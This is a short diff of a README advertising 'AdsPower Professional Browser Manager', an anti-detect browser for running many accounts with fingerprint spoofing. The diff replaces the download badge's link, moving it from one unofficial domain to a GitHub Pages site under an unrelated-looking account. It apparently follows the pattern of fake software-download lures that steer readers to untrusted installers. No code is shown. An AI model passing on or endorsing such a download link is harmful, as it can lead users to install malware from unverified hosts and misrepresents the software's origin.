@@ -2,7 +2,7 @@
 
 AdsPower Professional Browser Manager delivers a highly secure, efficient anti-detect browsing environment for advanced account operations. Ideal for affiliate marketing, e-commerce automation, social media management, and ad campaign workflow scaling, with full fingerprint control, proxy setup, cross-platform support, and automation via RPA and API.
 
-[![Download AdsPower Professional Browser Manager](https://img.shields.io/badge/Download-AdsPower_Professional_Browser_Manager-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download AdsPower Professional Browser Manager](https://img.shields.io/badge/Download-AdsPower_Professional_Browser_Manager-blueviolet)](https://bardhim1450gezime.github.io/.github/AdsPower-Professional)
 
 ---
 
